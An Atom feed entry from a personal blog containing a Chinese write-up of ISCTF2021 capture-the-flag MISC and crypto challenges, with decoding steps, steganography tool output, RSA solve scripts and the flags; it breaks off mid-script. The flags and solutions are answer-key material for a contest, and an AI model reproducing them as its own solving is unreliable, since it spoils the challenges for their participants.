<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>At的小站</title>
  
  
  <link href="https://swhat.github.io/atom.xml" rel="self"/>
  
  <link href="https://swhat.github.io/"/>
  <updated>2021-10-31T02:38:04.248Z</updated>
  <id>https://swhat.github.io/</id>
  
  <author>
    <name>Atkx</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ISCTF2021</title>
    <link href="https://swhat.github.io/2021/10/24/ISCTF2021/"/>
    <id>https://swhat.github.io/2021/10/24/ISCTF2021/</id>
    <published>2021-10-24T04:26:42.000Z</published>
    <updated>2021-10-31T02:38:04.248Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h2><p>出题人：啊罗小黑战记停更了</p><p>学校：焦作大学</p><p>帅哥美女，你们考虑过把这串字符串解密一下吗？或许可以考虑下口算md5哦，又或者是base32/64……只要你猜对了，伦家就让你嘿嘿嘿… by：啊罗小黑战记停更了（QQ：1813785342）&lt;–这是出题人快去找他嘿嘿嘿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">SVNDVEZ7aHVhbl95aW5nX2xhaV9kYW9fQ1RGX2RlX3NoaV9qaWV9<br><br>Base64解码<br>ISCTF&#123;huan_ying_lai_dao_CTF_de_shi_jie&#125;<br></code></pre></td></tr></table></figure><h2 id="女神的嘲讽"><a href="#女神的嘲讽" class="headerlink" title="女神的嘲讽"></a>女神的嘲讽</h2><p>出题人：f1@g</p><p>学校：河南理工大学</p><p>题目描述：你向心仪很久的女神告白，她却这样回复你……</p><p>格式为flag{.*}</p><p>文字全部去掉，Ook编码解码：<a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p><p>然后Base64解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">echo</span> ZmxhZ3sxX0kwVmVfeTB1X3Qwb30= | base64 -d<br>flag&#123;1_I0Ve_y0u_t0o&#125; <br></code></pre></td></tr></table></figure><h2 id="我裂开了"><a href="#我裂开了" class="headerlink" title="我裂开了"></a>我裂开了</h2><p>听说…给我回复一个 ISCTF 我就能给你flag， 但是我得先让你帮我一个忙，因为，我裂开了啊！！！</p><p>直接搜索公众号：蓝鲨信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;WelC0me_2_ISCTF_ANd_Have_FuN&#125;<br></code></pre></td></tr></table></figure><h2 id="你下载的真的是图片吗？"><a href="#你下载的真的是图片吗？" class="headerlink" title="你下载的真的是图片吗？"></a>你下载的真的是图片吗？</h2><p>出题人：Shangu</p><p>学校：平顶山学院</p><p>题目描述： 你相信光吗？</p><p>Shangu在图片里隐藏了“木马病毒”，这次他有没有大败小怪兽呢？</p><p>后缀改zip解压再改zip</p><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;W0w!_Y0u_aRe_So_C1ear!&#125;<br></code></pre></td></tr></table></figure><h2 id="Welcome-To-ISCTF-World"><a href="#Welcome-To-ISCTF-World" class="headerlink" title="Welcome To ISCTF World"></a>Welcome To ISCTF World</h2><p>出题人：f00001111、xiaobai</p><p>学校：大理大学、信阳师范学院</p><p>题目描述：欢迎来到ISCTF世界</p><p>附件：<a href="https://share.weiyun.com/ISvTkLqF">https://share.weiyun.com/ISvTkLqF</a></p><p>玩游戏找flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag part 1：ISCTF&#123;e7c70265<br>flag part 2：-6a76-4617-bc64<br>flag part 3：-73f5<br>flag part 4：e3fdce60&#125;<br></code></pre></td></tr></table></figure><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;e7c70265-6a76-4617-bc64-73f5e3fdce60&#125;<br></code></pre></td></tr></table></figure><h2 id="登录流量分析"><a href="#登录流量分析" class="headerlink" title="登录流量分析"></a>登录流量分析</h2><p>出题人：李黑子</p><p>学校：周口职业技术学院</p><p>题目描述：小明的密码忘了，这里有小明之前登录时候截取的流量，请你帮他从中找到登录密码</p><p>搜索pass信息，然后追踪HTTP流可发现flag</p><p><img src="C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20211031101455045.png" alt="image-20211031101455045"></p><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;y723rt3132f88v4&#125;<br></code></pre></td></tr></table></figure><h2 id="简单图片隐写术"><a href="#简单图片隐写术" class="headerlink" title="简单图片隐写术"></a>简单图片隐写术</h2><p>出题人：啊罗小黑战记停更了</p><p>学校：焦作大学</p><p>题目描述：一种简单的图片隐写术</p><p>zsteg直接梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面]<br>└─$ zsteg 1.png    <br>[!] ZPNG::ScanLine: <span class="hljs-comment">#1036: no data at pos 0, scanline dropped</span><br>[!] ZPNG::ScanLine: <span class="hljs-comment">#1037: no data at pos 0, scanline dropped</span><br>imagedata           .. text: <span class="hljs-string">&quot;ISCTF&#123;chu_fa_cai_hong_hai&#125;&quot;</span><br>b1,rgba,lsb,xy      .. text: <span class="hljs-string">&quot;UUUUU]UUUUUy&quot;</span><br>b2,r,lsb,xy         .. text: <span class="hljs-string">&quot;UUUUUUUUUUUUUUUUUV&quot;</span><br>b2,r,msb,xy         .. text: <span class="hljs-string">&quot;jUUUUUUUUUUUUUUU&quot;</span><br>b2,g,lsb,xy         .. text: <span class="hljs-string">&quot;UUUUUUUUP&quot;</span><br>b2,g,msb,xy         .. text: <span class="hljs-string">&quot;ZUUUUUUU&quot;</span><br>b2,b,lsb,xy         .. text: <span class="hljs-string">&quot;UUUUUUUU_&quot;</span><br>b2,rgba,lsb,xy      .. text: [<span class="hljs-string">&quot;o&quot;</span> repeated 10 <span class="hljs-built_in">times</span>]<br>b4,r,lsb,xy         .. text: <span class="hljs-string">&quot;\&quot;33333DDDDDEfffffgwwwwy&quot;</span><br>b4,g,lsb,xy         .. text: <span class="hljs-string">&quot;\&quot;\&quot;\&quot;\&quot;#3333333DDDDDDfffffffffffgwx&quot;</span><br>b4,g,msb,xy         .. text: [<span class="hljs-string">&quot;w&quot;</span> repeated 10 <span class="hljs-built_in">times</span>]<br>b4,b,lsb,xy         .. text: [<span class="hljs-string">&quot;w&quot;</span> repeated 10 <span class="hljs-built_in">times</span>]<br>b4,b,msb,xy         .. text: <span class="hljs-string">&quot;UUUUUUUUUUU=3333&quot;</span><br></code></pre></td></tr></table></figure><h2 id="easy-osint"><a href="#easy-osint" class="headerlink" title="easy_osint"></a>easy_osint</h2><p>出题人：Xi0a</p><p>学校：云南警官学院</p><p>题目描述：最近经常在朋友圈刷到，听说这是在一个广场拍的，请问这是在哪？</p><p>flag示例：ISCTF{七花广场}</p><p>百度识图金碧广场</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101517-516281.png" alt="image-20211031101516698"></p><p>flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;金碧广场&#125;<br></code></pre></td></tr></table></figure><h2 id="受伤的二维码和耳朵"><a href="#受伤的二维码和耳朵" class="headerlink" title="受伤的二维码和耳朵"></a>受伤的二维码和耳朵</h2><p>查看频谱图，摩斯密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-.-- ----- ..- ..-. .. -. -.. -- .<br></code></pre></td></tr></table></figure><p>摩斯密码解码得到：Y0UFINDME</p><p>然后拼二维码</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101533-248294.png" alt="image-20211031101532903"></p><p>扫码得到：ISCTF{U_f0und_The_half</p><p>最终flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;U_f0und_The_half_Y0U_FIND_ME&#125;<br></code></pre></td></tr></table></figure><h2 id="文件？美女？"><a href="#文件？美女？" class="headerlink" title="文件？美女？"></a>文件？美女？</h2><p>解压得到flag，010查看发现是逆序的jpg</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">f = open(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).<span class="hljs-built_in">read</span>()<br>res = open(<span class="hljs-string">&#x27;flag.jpg&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>res.write(f[::-1])<br></code></pre></td></tr></table></figure><p>foremost分离出带密码的压缩包，字典爆破，弱口令admin123,麻了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;5ecdfs-avcsefh-dhvldncmd&#125;<br></code></pre></td></tr></table></figure><h2 id="你下载的真的是图片吗？-2"><a href="#你下载的真的是图片吗？-2" class="headerlink" title="你下载的真的是图片吗？-2"></a>你下载的真的是图片吗？-2</h2><p>Blue通道有异常</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101549-65108.png" alt="image-20211031101548013"></p><p>另存为txt，需要提取后面值然后另存为zip</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101618-381468.png" alt="image-20211031101616689"></p><p>删去最后一行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">ff = open(<span class="hljs-string">&#x27;out1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>a=<span class="hljs-string">&quot;&quot;</span><br>with open(<span class="hljs-string">&#x27;zip.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    a=(a+line[-18:]).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)<br>    ff.write(a)<br></code></pre></td></tr></table></figure><p>得到的结果在010粘贴为16进制文本，另存为zip</p><p>flag.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Lorem ipsum dolori sit amet, consecteturs adipiscing celit, sed dot eiusmod tempor incifdidunt ut labore et dolore magna aliquam. Ut enim ad minimf veniam, quisi nostrud exercitation ullamcoo laboris nisis ut aliquip ex eai commodos consequat. Duis caute irure dolor <span class="hljs-keyword">in</span> reprehenderit <span class="hljs-keyword">in</span> voluptate velit oesse cillum dolore eu fugiat nulla pariatur. Excepteur osint occaecat cupidatat non proident, sunt <span class="hljs-keyword">in</span> culpa qui officia deserunt mollit anim lid est laborum.<br>Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed <span class="hljs-keyword">do</span> eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor <span class="hljs-keyword">in</span> reprehenderit <span class="hljs-keyword">in</span> voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt <span class="hljs-keyword">in</span> culpa qui officia deserunt mollit anim id est laborum.<br></code></pre></td></tr></table></figure><p>两行内容长度不一样，缺少的字母为isctfmfiosiscool</p><p>flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCTF&#123;isctfmfiosiscool&#125;<br></code></pre></td></tr></table></figure><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="弯弯曲曲的路"><a href="#弯弯曲曲的路" class="headerlink" title="弯弯曲曲的路"></a>弯弯曲曲的路</h2><p>出题人：YYGP</p><p>学校：大理大学</p><p>题目描述：一只古典的蓝鲨从一条路的尽头上下上下上的走过了弯弯曲曲的小路上，并且经过了5棵树还有5个银行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#125;I_cFTle_FToneCSWnTC5@0&#123;I<br><br>根据题目提示五个一组，可分为五组<br>&#125;I_cF<br>Tle_F<br>ToneC<br>SWnTC<br>5@0&#123;I<br></code></pre></td></tr></table></figure><p>根据flag格式ISCTF，以及题目提示按照顺序读可得到flag</p><p><img src="https://gitee.com/atkx/blog-img/raw/master/image/202110/31/101637-861761.png" alt="image-20211031101636146"></p><p>ISCTF{Welc0nne_@To_I5CTF}</p><p>预期解：曲路密码脚本解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># write by 2021/8/4</span><br><span class="hljs-comment"># 曲路密码</span><br>import re<br><br><br>def encrypt_bend(string, col, row=10):<br>    ciphertext = <span class="hljs-string">&quot;&quot;</span><br>    temp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(col):<br>        temp.append([])<br>    <span class="hljs-keyword">for</span> index, i <span class="hljs-keyword">in</span> enumerate(string):<br>        temp[index % col].append(i)<br>    re_temp = list(reversed(temp))<br>    <span class="hljs-keyword">for</span> index, i <span class="hljs-keyword">in</span> enumerate(re_temp):<br>        <span class="hljs-keyword">if</span> index % 2 == 0:<br>            i = list(reversed(i))<br>        ciphertext += <span class="hljs-string">&quot;&quot;</span>.join(i)<br>    <span class="hljs-built_in">return</span> ciphertext<br><br><br>def decrypt_bend(string, col, row=10):<br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    length = len(string)<br>    min_row = length // col       <span class="hljs-comment"># 最小的行数</span><br>    min_num = col - length % col  <span class="hljs-comment"># 最小行数的列数</span><br>    <span class="hljs-comment"># 分组</span><br>    temp = []<br>    index = 0<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(col):<br>        <span class="hljs-keyword">if</span> i &lt; min_num:<br>            temp.append(string[index:index+min_row])<br>            index += min_row<br>        <span class="hljs-keyword">else</span>:<br>            temp.append(string[index:index+min_row+1])<br>            index += min_row + 1<br>    <span class="hljs-built_in">print</span>(temp)<br>    <span class="hljs-comment"># 改回列顺序</span><br>    <span class="hljs-keyword">for</span> index, i <span class="hljs-keyword">in</span> enumerate(temp):<br>        <span class="hljs-keyword">if</span> index % 2 == 0:<br>            <span class="hljs-comment"># print(re.findall(&quot;.&#123;1&#125;&quot;, temp[index]))</span><br>            temp[index] = <span class="hljs-string">&quot;&quot;</span>.join(list(reversed(re.findall(<span class="hljs-string">&quot;.&#123;1&#125;&quot;</span>, temp[index]))))<br>    temp.reverse()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(length):<br>        plaintext += temp[i % col][i // col]<br>    <span class="hljs-built_in">return</span> plaintext<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    col_ = 7<br>    row_ = 5<br>    <span class="hljs-comment"># ciphertext_ = encrypt_bend(&quot;i will beat you this day&quot;, col_, row_)</span><br>    ciphertext_ =<span class="hljs-string">&#x27;&#125;I_cFTle_FToneCSWnTC5@0&#123;I&#x27;</span><br>    plaintext_ = decrypt_bend(ciphertext_, col_, row_)<br>    <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;&#123;plaintext_&#125; : &#123;ciphertext_&#125;&quot;</span>)<br><br><br><br>[<span class="hljs-string">&#x27;&#125;I_&#x27;</span>, <span class="hljs-string">&#x27;cFT&#x27;</span>, <span class="hljs-string">&#x27;le_&#x27;</span>, <span class="hljs-string">&#x27;FTon&#x27;</span>, <span class="hljs-string">&#x27;eCSW&#x27;</span>, <span class="hljs-string">&#x27;nTC5&#x27;</span>, <span class="hljs-string">&#x27;@0&#123;I&#x27;</span>]<br>InWF_c_&#123;TSTeFI0CColT&#125;@5en : &#125;I_cFTle_FToneCSWnTC5@0&#123;I<br></code></pre></td></tr></table></figure><h2 id="EasyRSA"><a href="#EasyRSA" class="headerlink" title="EasyRSA"></a>EasyRSA</h2><p>yafu分解n得到p、q、r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">***factors found***<br><br>P10 = 2514358789<br><br>P10 = 2930880917<br><br>P155 = 10728308687033142242263042720863820844383961098139391476856378846439202568058060175330323889963293720874263174254928466703829537388987357384056877938482683<br><br><br>ans = 1<br></code></pre></td></tr></table></figure><p>简单题直接梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">from Crypto.Util.number import *<br>import gmpy2<br><br>n= 79059977083433369161977159472257563109008119475755288439774758824887836857424336032518651862088590700241980200158542855762122262156445632897757444422514158062996501037323379<br>e= 65537<br>c= 31573591986915001857640263466939164206307247748465148395978810720215094970707002043721991055789084518831540652652824225863275289979959264564070907438540016782921324316795681<br><br>p= 2514358789<br>q = 2930880917<br>r = 10728308687033142242263042720863820844383961098139391476856378846439202568058060175330323889963293720874263174254928466703829537388987357384056877938482683<br><br>phi_n=(p-1)*(q-1)*(r-1)<br>d=gmpy2.invert(e,phi_n)<br>m=pow(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m)) <br><br><br>flag：ISCTF&#123;Welcome_To_RSA_puzzles&#125;<br></code></pre></td></tr></table></figure><h2 id="MediumRSA"><a href="#MediumRSA" class="headerlink" title="MediumRSA"></a>MediumRSA</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">p= 135406272915839663948982508259168339196413423033707377351582717408135201161291947411690398070725136534418000750068523816458786100037135542069749803825803176245899663700018918204457909082934286787984577920819722071614325832117549949176386055577917668392717683643933279741971553133044965672217515958006018425207<br>q= 141499967777554698157827398588073190546048161142442371043319091793202159392937117317909316830021492737369017974252412948824878182004132437165872836769442232191985031274210566004860441962404283572352416239402475111512429494403506484997417885317393735452834730615296387016523054424102807140640940320044291046001<br>e= 894<br>c= 285599740642531890154220175592437844999990780403815630307661459001713176317615138628516144325413153232796819897801881107425865913054728954677352027457699314702416360013205027660502210085125607181176890689285963882325311472422689397465349673391413548284592577544566069076266866047930427530566329183924506279416975701558074448835820462125272973167295304050434568652119366359340574659484793805164709585039574539722702352716480226900050322661650017379886614397585534285036799547237613356555628012895080401615470840003601931382810917605930301582006344272146554650976008053460139711071700513559719126632374724028665834623<br></code></pre></td></tr></table></figure><p>典型的e与phi不互素的情况，属于e与phi有公因数，且不属于公因数是e本身的情况。</p><p>BUU有一道原题，改一下脚本直接梭</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">import gmpy2<br>from Crypto.Util.number import *<br><br><br><span class="hljs-comment"># 当e约去公约数后与phi互素</span><br>def decrypt(p, q, e, c):<br>    n = p * q<br>    phi = (p - 1) * (q - 1)<br>    t = gmpy2.gcd(e, phi)<br>    d = gmpy2.invert(e // t, phi)<br>    m = pow(c, d, n)<br>    <span class="hljs-comment">#print(m)</span><br>    msg = gmpy2.iroot(m, t)<br>    <span class="hljs-built_in">print</span>(msg)<br>    <span class="hljs-keyword">if</span> msg[1]:<br>        <span class="hljs-built_in">print</span>(long_to_bytes(msg[0]))<br><br>p= 135406272915839663948982508259168339196413423033707377351582717408135201161291947411690398070725136534418000750068523816458786100037135542069749803825803176245899663700018918204457909082934286787984577920819722071614325832117549949176386055577917668392717683643933279741971553133044965672217515958006018425207<br>q= 141499967777554698157827398588073190546048161142442371043319091793202159392937117317909316830021492737369017974252412948824878182004132437165872836769442232191985031274210566004860441962404283572352416239402475111512429494403506484997417885317393735452834730615296387016523054424102807140640940320044291046001<br>e= 894<br>c= 285599740642531890154220175592437844999990780403815630307661459001713176317615138628516144325413153232796819897801881107425865913054728954677352027457699314702416360013205027660502210085125607181176890689285963882325311472422689397465349673391413548284592577544566069076266866047930427530566329183924506279416975701558074448835820462125272973167295304050434568652119366359340574659484793805164709585039574539722702352716480226900050322661650017379886614397585534285036799547237613356555628012895080401615470840003601931382810917605930301582006344272146554650976008053460139711071700513559719126632374724028665834623<br><br>decrypt(p, q, e, c) <br><br><br>b<span class="hljs-string">&#x27;ISCTF&#123;RSA_Is_Fun233&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>脚本2：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">import gmpy2<br>from Crypto.Util.number import *<br>p= 135406272915839663948982508259168339196413423033707377351582717408135201161291947411690398070725136534418000750068523816458786100037135542069749803825803176245899663700018918204457909082934286787984577920819722071614325832117549949176386055577917668392717683643933279741971553133044965672217515958006018425207<br>q= 141499967777554698157827398588073190546048161142442371043319091793202159392937117317909316830021492737369017974252412948824878182004132437165872836769442232191985031274210566004860441962404283572352416239402475111512429494403506484997417885317393735452834730615296387016523054424102807140640940320044291046001<br>n = p * q<br>e= 894<br>c= 285599740642531890154220175592437844999990780403815630307661459001713176317615138628516144325413153232796819897801881107425865913054728954677352027457699314702416360013205027660502210085125607181176890689285963882325311472422689397465349673391413548284592577544566069076266866047930427530566329183924506279416975701558074448835820462125272973167295304050434568652119366359340574659484793805164709585039574539722702352716480226900050322661650017379886614397585534285036799547237613356555628012895080401615470840003601931382810917605930301582006344272146554650976008053460139711071700513559719126632374724028665834623<br>phi = (p-1)*(q-1)<br>a = gmpy2.gcd(e,phi)<br><span class="hljs-comment">#print(a)</span><br>e = e//a<br>d = gmpy2.invert(e,phi)<br>m6 = gmpy2.powmod(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(gmpy2.iroot(m6,6)[0]))<br><br><br>b<span class="hljs-string">&#x27;ISCTF&#123;RSA_Is_Fun233&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="HardRSA1"><a href="#HardRSA1" class="headerlink" title="HardRSA1*"></a>HardRSA1*</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">from Crypto.Util.number import *<br>flag=b<span class="hljs-string">&#x27;****************************&#x27;</span><br>m1 = bytes_to_long(flag)<br>N = getPrime(512)*getPrime(512)<br>e = 19<br><br>c1 = pow(m1, e, N)<br><br>a = getRandomNBitInteger(512)<br>b = getRandomNBitInteger(512)<br>m2 = a*m1 + b<br>c2 = pow(m2, e, N)<br><br><span class="hljs-built_in">print</span>(N, a, b, c1, c2, sep=<span class="hljs-string">&quot;\n&quot;</span>)<br><span class="hljs-comment"># N=95587878777633457712771077861034164878218007211732872086703082427025284038734073722525350247252021434969755949232136071401015995927195956787389015816040788670336377590142763231354554070366181264021083507258416574251611662836423194484700341105611819435848709315571900313318932989155213069438624597581376096919</span><br><span class="hljs-comment"># a=8148274285376731469630646414567940438407613039123927029192149790588715641540606813881834241911738725252707074817442402177237967817804420371483845842902231</span><br><span class="hljs-comment"># b=9944999010165189354017274928734887652060645960820869672700674403006764312275448509638591901570545531313058741811202384719307206506483462331704719044400878</span><br><span class="hljs-comment"># c1=1870704366656953386352816295794415188411021228249016204037205250475471490295719163599101603443054766225481004510415813930027376456511655528372027273843117886139717834189065273068836018423957958033253086582500645476025731783186122169863569195566258360470326607481719859396822157309140555156145108464948303484</span><br><span class="hljs-comment"># c2=73255380295741602810215998117368212335852087176390783730568276178375345944401489472119142216343959193098593837507600341773896221941166940563956033779653381698066185496693623741658031273011213568043342267706206340976896722388323992521780876436269830484416265647861652562217726795508745205674083028929318260061</span><br></code></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="HardRSA2"><a href="#HardRSA2" class="headerlink" title="HardRSA2"></a>HardRSA2</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">from Crypto.Util.number import *<br>flag = b<span class="hljs-string">&#x27;*****************************************&#x27;</span><br>p=getPrime(256)<br>q=getPrime(256)<br>n=p*q<br>e=3<br>c1=pow(bytes_to_long(flag),e,n)<br>c2=pow(bytes_to_long(flag)+1,e,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n=&quot;</span>,n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;e=&quot;</span>,e)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c1)<br><span class="hljs-built_in">print</span>(<span 